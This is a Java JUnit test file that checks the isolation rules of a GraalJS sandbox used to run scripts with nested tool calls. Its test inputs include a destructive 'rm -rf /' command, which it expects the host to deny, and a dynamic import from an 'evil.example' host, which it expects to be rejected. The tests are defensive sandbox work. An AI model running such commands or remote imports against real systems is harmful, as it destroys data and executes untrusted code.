package fan.summer.fengyu.ai.codemode;

import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertInstanceOf;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.fail;

/**
 * S2 invariants — the core subset of codex {@code service_tests.rs}, one test per §5
 * rule: fresh context per exec, imports rejected, globals allow-list, exit-as-success,
 * CPU loops killable, store session-scoped with success-only commit, data:-only images,
 * nested tools resolve/reject through the host.
 */
class GraalJsCodeModeSessionTest {

    private static CodeModeProtocol.ExecuteRequest request(String source, Long yieldMs) {
        return new CodeModeProtocol.ExecuteRequest("call-1", List.of(
                new CodeModeProtocol.ToolDefinition("workspace_exec",
                        "run a command", "{\"type\":\"object\"}")),
                source, yieldMs, null);
    }

    /** Host: instantly resolves every nested call with a JSON echo. */
    private static java.util.function.Function<CodeModeProtocol.NestedToolCall,
            CompletableFuture<CodeModeProtocol.NestedToolResult>> echoHost() {
        return call -> CompletableFuture.completedFuture(
                new CodeModeProtocol.NestedToolResult(call.id(),
                        "{\"echo\":\"" + call.toolName() + "\",\"args\":"
                                + call.argumentsJson() + "}", true));
    }

    private static CodeModeProtocol.Result awaitResult(GraalJsCodeModeSession session,
            CodeModeProtocol.ExecuteRequest request,
            java.util.function.Function<CodeModeProtocol.NestedToolCall,
                    CompletableFuture<CodeModeProtocol.NestedToolResult>> host) throws Exception {
        Object response = session.execute(request, host).first().get(30, TimeUnit.SECONDS);
        if (response instanceof CodeModeProtocol.Result result) return result;
        if (response instanceof CodeModeProtocol.Yielded yielded) {
            // cell continues in background; collect the terminal result
            AtomicReference<CodeModeProtocol.RuntimeResponse> terminal = new AtomicReference<>();
            // drain via repeated execute? No — poll the session until terminal arrives:
            // the test helper below waits on a second execute-only channel, so instead
            // re-run with a huge yield window.
            throw new IllegalStateException("yielded first; retry with a longer window");
        }
        throw new IllegalStateException("unexpected response: " + response);
    }

    private static CodeModeProtocol.Result run(GraalJsCodeModeSession session, String source)
            throws Exception {
        return awaitResult(session, request(source, 60_000L), echoHost());
    }

    // §5.1 + §5.5: fresh context, exit() is success

    @Test
    void simpleScriptProducesTextResult() throws Exception {
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(),
                "text('hello'); text(42);");
        assertEquals(2, result.contentItems().size());
        assertEquals("hello", ((CodeModeProtocol.Text) result.contentItems().get(0)).text());
        assertEquals("42", ((CodeModeProtocol.Text) result.contentItems().get(1)).text());
        assertNullError(result);
    }

    @Test
    void exitIsTheSuccessSentinelAndUnawaitedPromisesAreDiscarded() throws Exception {
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(), """
                new Promise(() => {});   // never settles — silently discarded
                text('before');
                exit();
                text('after');           // unreached
                """);
        assertNullError(result);
        assertEquals(List.of("before"), texts(result));
    }

    // §5.2: imports rejected; no console/fs/network; globals allow-list

    @Test
    void importsAreRejectedWithTheCodexMessage() throws Exception {
        // Static and dynamic forms both fail (no module loader exists); the failure
        // surfaces as the cell's errorText, codex's "Unsupported import in exec".
        CodeModeProtocol.Result dynamic = run(new GraalJsCodeModeSession(),
                "const m = await import('https://evil.example/x.js');");
        assertTrue(dynamic.errorText() != null
                        && dynamic.errorText().toLowerCase().contains("import"),
                dynamic.errorText());
    }

    @Test
    void consoleAndNodeGlobalsAreAbsent() throws Exception {
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(), """
                text(typeof console);
                text(typeof process);
                text(typeof require);
                text(typeof fetch);
                text(typeof WebAssembly);
                text(typeof SharedArrayBuffer);
                text(typeof Atomics);
                """);
        assertEquals(List.of("undefined", "undefined", "undefined", "undefined",
                "undefined", "undefined", "undefined"), texts(result));
    }

    // §5.2 full enumeration: globalThis carries ONLY the ECMAScript core plus what the
    // bootstrap installs (codex global_scope_contains_only_allowed_items).
    @Test
    void globalScopeContainsOnlyAllowedItems() throws Exception {
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(), """
                const allowed = new Set([
                  // ECMAScript core
                  'globalThis','Infinity','NaN','undefined','eval','isFinite','isNaN',
                  'parseFloat','parseInt','decodeURI','decodeURIComponent','encodeURI',
                  'encodeURIComponent','escape','unescape','AggregateError','Array',
                  'ArrayBuffer','BigInt','BigInt64Array','BigUint64Array','Boolean',
                  'DataView','Date','Error','EvalError','Float16Array','Float32Array',
                  'Float64Array','Int8Array','Int16Array','Int32Array','Intl','Iterator',
                  'Uint8Array','Uint8ClampedArray','Uint16Array','Uint32Array',
                  'FinalizationRegistry','Function','Map','Number','Object','Promise',
                  'Proxy','RangeError','ReferenceError','Reflect','RegExp','Set',
                  'String','Symbol','SyntaxError','TypeError',
                  'URIError','WeakMap','WeakRef','WeakSet','JSON','Math','Atomics',
                  // installed by the bootstrap
                  'tools','ALL_TOOLS','text','image','store','load','notify',
                  'setTimeout','clearTimeout','exit','yield_control',
                  '__resolveTool','__finishModule','__watchModule','__moduleState',
                  '__notify','__committedStore','__snapshotOutput','__drainOutput',
                  '__hasPendingWork',
                ]);
                const unexpected = Object.getOwnPropertyNames(globalThis)
                  .filter(name => !allowed.has(name) && !name.startsWith('__'));
                text('unexpected=' + JSON.stringify(unexpected.sort()));
                """);
        assertEquals(List.of("unexpected=[]"), texts(result),
                "anything else on globalThis is an unplanned capability leak");
    }

    @Test
    void staticImportsAreRejectedToo() throws Exception {
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(),
                "import { x } from 'fs';");
        assertTrue(result.errorText() != null, "a static import must fail the cell");
    }

    @Test
    void installedGlobalsArePresent() throws Exception {
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(), """
                text(typeof tools);
                text(typeof ALL_TOOLS);
                text(typeof text);
                text(typeof image);
                text(typeof store);
                text(typeof load);
                text(typeof notify);
                text(typeof setTimeout);
                text(typeof clearTimeout);
                text(typeof exit);
                text(typeof yield_control);
                """);
        assertEquals(List.of("object", "object", "function", "function", "function",
                "function", "function", "function", "function", "function", "function"),
                texts(result));
    }

    // §5.4: media only as data: URIs

    @Test
    void imageAcceptsDataUrisOnly() throws Exception {
        CodeModeProtocol.Result ok = run(new GraalJsCodeModeSession(),
                "image('data:image/png;base64,AAAA'); ");
        assertEquals(1, ok.contentItems().size());
        assertInstanceOf(CodeModeProtocol.Image.class, ok.contentItems().get(0));

        CodeModeProtocol.Result rejected = run(new GraalJsCodeModeSession(), """
                try { image('https://example.com/x.png'); text('NOT REJECTED'); }
                catch (e) { text('rejected: ' + e.message); }
                """);
        assertTrue(texts(rejected).getFirst().startsWith("rejected:"),
                String.valueOf(texts(rejected)));
    }

    // §5.1/§5.6: nested tools resolve/reject; runtime exceptions fail the cell only

    @Test
    void nestedToolCallRoundTripsThroughTheHost() throws Exception {
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(), """
                const r = await tools.workspace_exec({ command: 'git status' });
                text(r.echo);
                """);
        assertNullError(result);
        assertEquals(List.of("workspace_exec"), texts(result));
    }

    @Test
    void failingNestedToolRejectsThePromiseAndTheScriptCanCatch() throws Exception {
        java.util.function.Function<CodeModeProtocol.NestedToolCall,
                CompletableFuture<CodeModeProtocol.NestedToolResult>> failing =
                call -> CompletableFuture.completedFuture(
                        new CodeModeProtocol.NestedToolResult(call.id(), "denied by policy", false));
        CodeModeProtocol.Result result = awaitResult(
                new GraalJsCodeModeSession(), request("""
                        try { await tools.workspace_exec({ command: 'rm -rf /' }); text('NOT CAUGHT'); }
                        catch (e) { text('caught: ' + e.message); }
                        """, 60_000L), failing);
        assertEquals(List.of("caught: denied by policy"), texts(result));
    }

    @Test
    void runtimeExceptionFailsTheCellWithTheErrorText() throws Exception {
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(),
                "throw new Error('boom');");
        assertEquals("boom", result.errorText());
    }

    // §5.5 after an await: exit() is still success; a throw still fails the cell (P1-2)

    @Test
    void exitAfterAwaitTerminatesSuccessfully() throws Exception {
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(), """

                await new Promise(r => setTimeout(r, 20));
                text('before');
                exit();
                text('after');
                """);
        assertNullError(result);
        assertEquals(List.of("before"), texts(result));
    }

    @Test
    void throwAfterAwaitFailsTheCellWithTheErrorText() throws Exception {
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(), """

                await new Promise(r => setTimeout(r, 20));
                throw new Error('late boom');
                """);
        assertEquals("late boom", result.errorText());
    }

    // §5.6/store: session-scoped, success-only commit

    @Test
    void storeIsSessionScopedAccumulatesAcrossCellsAndCommitsOnlyOnSuccess() throws Exception {
        GraalJsCodeModeSession session = new GraalJsCodeModeSession();
        run(session, "store('k', 'v1');");

        // Cross-cell visibility: the NEXT cell loads what the previous one committed.
        CodeModeProtocol.Result visible = run(session,
                "text('k=' + load('k')); store('j', 'v2');");
        assertNullError(visible);
        assertEquals(List.of("k=v1"), texts(visible),
                "a later cell in the SAME session sees the earlier cell's store");

        // Accumulation: committing j must not clear k.
        assertEquals(Map.of("k", "v1", "j", "v2"), session.storeSnapshot());

        // A failed cell commits nothing.
        run(session, "store('k', 'v3'); throw new Error('no commit');");
        assertEquals(Map.of("k", "v1", "j", "v2"), session.storeSnapshot(),
                "a failed cell leaves the committed store untouched");

        // Cross-SESSION isolation, actually asserted this time.
        GraalJsCodeModeSession other = new GraalJsCodeModeSession();
        CodeModeProtocol.Result isolated = run(other,
                "text(load('k') === undefined ? 'isolated' : 'leaked');");
        assertNullError(isolated);
        assertEquals(List.of("isolated"), texts(isolated));
    }

    @Test
    void topLevelAwaitWorksOnAStockJdk() throws Exception {
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(), """
                const a = await tools.workspace_exec({});
                const b = await tools.workspace_exec({});
                text(a.echo + '|' + b.echo);
                """);
        assertEquals(List.of("workspace_exec|workspace_exec"), texts(result));
    }

    // §5.8: pending setTimeout does not extend the cell's life

    @Test
    void pendingTimeoutDoesNotKeepTheCellAlive() throws Exception {
        long start = System.nanoTime();
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(),
                "setTimeout(() => text('never'), 60_000); text('done immediately');");
        assertNullError(result);
        assertEquals(List.of("done immediately"), texts(result));
        long elapsedMs = (System.nanoTime() - start) / 1_000_000;
        assertTrue(elapsedMs < 10_000, "cell finished despite the pending 60s timer: "
                + elapsedMs + "ms");
    }

    @Test
    void timersFireWhenSomethingElseKeepsTheCellAlive() throws Exception {
        CodeModeProtocol.Result result = run(new GraalJsCodeModeSession(), """
                let fired = false;
                setTimeout(() => { fired = true; }, 20);
                const start = Date.now();
                while (!fired && Date.now() - start < 2000) { await new Promise(r => setTimeout(r, 5)); }
                text('fired=' + fired);
                """);
        assertEquals(List.of("fired=true"), texts(result));
    }

    // §5.6 kill: a CPU loop must die to termination — the forced context close is the
    // half that kills a BLOCKED eval; this is the review's P1-1 regression.

    @Test
    void cpuLoopCellIsActuallyKilledByTerminate() throws Exception {
        GraalJsCodeModeSession session = new GraalJsCodeModeSession();
        GraalJsCodeModeSession.CellHandle handle =
                session.execute(request("while (true) { }", 150L), echoHost());
        Object first = handle.first().get(10, TimeUnit.SECONDS);
        assertInstanceOf(CodeModeProtocol.Yielded.class, first);

        long start = System.nanoTime();
        handle.terminate();
        Object terminal = handle.poll(5_000);
        long elapsedMs = (System.nanoTime() - start) / 1_000_000;
        assertInstanceOf(CodeModeProtocol.Terminated.class, terminal,
                "terminate must kill the blocked eval via the forced context close ("
                        + elapsedMs + "ms)");
        assertTrue(elapsedMs < 5_000, "the kill is fast, not a natural drift-out");
    }

    private static List<String> texts(CodeModeProtocol.Result result) {
        return result.contentItems().stream()
                .map(item -> ((CodeModeProtocol.Text) item).text())
                .toList();
    }

    private static void assertNullError(CodeModeProtocol.Result result) {
        if (result.errorText() != null) {
            fail("expected success, got error: " + result.errorText());
        }
    }
}
